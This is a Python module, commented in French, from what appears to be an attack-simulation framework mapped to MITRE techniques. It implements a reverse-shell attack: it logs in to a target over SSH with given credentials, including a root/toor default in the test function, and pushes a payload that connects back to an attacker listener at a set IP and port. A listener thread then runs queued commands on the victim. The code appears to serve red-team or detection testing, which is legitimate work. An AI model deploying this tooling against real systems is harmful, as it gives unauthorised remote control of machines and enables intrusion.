#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Mon Apr 27 12:00:04 2026

@author: hounsousamuel
"""

import os, sys
sys.path.insert(1, os.path.dirname(os.path.abspath(os.path.join(__file__, "..", ".."))))

import time
import asyncio
import threading
import subprocess
from tactics.base import Base
from tactics.execution.python_execution import PythonExecution
from tactics.mittres import MITRE
from tactics.execution.data.reverse_shell.attaquant import AttaquantResult, attaquant, DEFAULT_COMMANDS
from tactics.execution.data.reverse_shell.victime import VICTIME
from simulateur_utils.logger import get_logger

logger = get_logger()

class ReverseShell(PythonExecution):
    """
    Classe héritant de PythonExecution qui implémente le reverse shell avec ssh
    """
    def __init__(
        self, 
        name:str = "reverse_shell",
        timeout:int = 2, 
        exec_timeout:int = 100,
        **kwargs
    ):
        """
        Méthode d'instanciation.

        Parameters
        ----------
        name : str, optional
            Nom a dommé a la classe. The default is "reverse_shell".
        timeout : int, optional
            Timeout de connexion. The default is 2.
        exec_timeout : int, optional
            Timeout d'éxécution. The default is 100.
        **kwargs : dict
            Autre options.

        Returns
        -------
        None.

        """
        self.name = name
        super().__init__(name=self.name, timeout=timeout, exec_timeout=exec_timeout, **kwargs)
        self.attaquant_result:AttaquantResult|None = None
        self.th = None
        self.success = False
        self.py_result = {}
        self.reverse = True
    
    async def reverse_async(
        self,
        ip:str,
        port:str,
        attaquant_ip:str,
        attaquant_port:str,
        username:str,
        password:str,
        commands:list[dict|str],
        timeout:float = 120,
        delay:int = 0.5,
        total_timeout:int = 50,
        pkey=None
    ) -> dict:
        """
        Méthode principale qui implément l'attaque.

        Parameters
        ----------
        ip : str
            L'IP.
        port : str
            Le port.
        attaquant_ip : str
            L'ip de l'attaquant.
        attaquant_port : str
            Le port de l'attaquant.
        username : str
            Le username.
        password : str
            Le password.
        commands : list[dict|str]
            Les commmandes a exécuter.
        timeout : float, optional
            Timeoute de connexions. The default is 120.
        delay : int, optional
            Le delai entre l'éxécution des commandes. The default is 0.5.
        total_timeout : int, optional
            Timeout total d'attaque. The default is 50.

        Returns
        -------
        dict
            Les résultats.

        """
        try:
            VICTIME_CMD = VICTIME.replace("{SHIELD_MARKER_IP}", str(attaquant_ip)).replace("{SHIELD_MARKER_PORT}", str(attaquant_port))
            self.log(f"Début Reverse Shell à : {time.ctime()}, pour ip : {ip} et port {port} , attaquant_ip={attaquant_ip}, attaquant_port={attaquant_port}", log=True)
            self.log(f"Username: {username}, Password: {password}, commandes: {len(commands)}", log=True)
            self.start_time = time.time()
            
            attaque_result = AttaquantResult()
            try:
                subprocess.run(f"sudo pkill -f {attaquant_port}", shell=True, capture_output=True)
                subprocess.run(f"sudo  fuser -f {attaquant_port}/tcp", shell=True, capture_output=True)
            except Exception:
                pass
            
            await asyncio.sleep(1.5)
            th = threading.Thread(
                name="reverse_shell_attaquant_thread",
                target=attaquant,
                args=(attaquant_ip, attaquant_port, commands, attaque_result, timeout),
                daemon=True
            )
            th.start()
            self.th = th
            
            self.log("⏳ Attente que le listener soit prêt...", log=True)
            await asyncio.sleep(1) 
            
            self.log("📤 Envoi du script à la victime...", log=True)
            py_result = await self.exec_command_async(
                ip=ip,
                port=port,
                username=username,
                password=password,
                python_commands=[{"cmd": VICTIME_CMD, "bg": True}],
                add_common=False,
                pkey=pkey
            )
            self.py_result = py_result
            if py_result.get("results", {}).get("success_rate", 0) == 1.0  or \
                py_result.get("results", {}).get("success_number", 0) == 1:
                    self.success = len(attaque_result.success_commands()) > 0 if len(commands) != 0 else True
                    self.log("Succès de l'éxécution du script chez la victime !", log=True)
            else:
                self.log("Echec de l'exécution du script chez la victime !", log=True)
                logger.print("Py result : \n", py_result)
            
            if self.th:
                self.th.join(total_timeout)
            
            self.attaquant_result = attaque_result
                
        except Exception as e:
            logger.print("Erreur dans reverse shell :", str(e))
        
        finally:
            self.end_time = time.time()
            # try:
            #     subprocess.run(f"sudo pkill -f {attaquant_port}", shell=True)
            # except:
            #     pass
            self.log("Fin Reverse Shell!", log=True)
            return self.reverse_get_result()
    
    def reverse_sync(self, *args, **kwargs):
        """ Version synchrone de reverse_async """
        return asyncio.run(self.reverse_async(*args, **kwargs))
    
    def reverse_get_result(self):
        """ Méthode de fabrication du résultat finale, renvoie un dictionnaire """
        self.save()
        
        mitres = [MITRE.get("ReverseShell", {})]
        results = {
            'severity': 'HIGH' if self.success else 'LOW',
            'elapsed': self.end_time - self.start_time,
            "mitres": mitres,
            "results":  {
                "attaquant_result": self.attaquant_result.to_dict() if self.attaquant_result else {},
                "py_result": self.py_result
            },
        }
        
        return results

def test_reverse_shell(ip: str, username:str = "root", password:str = "toor", pkey=None):
    """Test rapide de ReverseShell sur une cible."""
    import json
    from pprint import pprint
    command_exec = ReverseShell()
    aip = "172.17.0.1" #"172.17.0.1" # "127.0.0.1"
    result = command_exec.reverse_sync(
        ip=ip,
        port=22,
        attaquant_ip=aip,
        attaquant_port=4448,
        username=username,
        password=password,
        commands=DEFAULT_COMMANDS,
        pkey=pkey
    )
    try:
        logger.print("✅ Résultat :")
        logger.print(json.dumps(result, indent=2, ensure_ascii=False), verify=False)
    except Exception:
        try:
            pprint(result, indent=2)
        except Exception:
            logger.print(result, verify=False)
            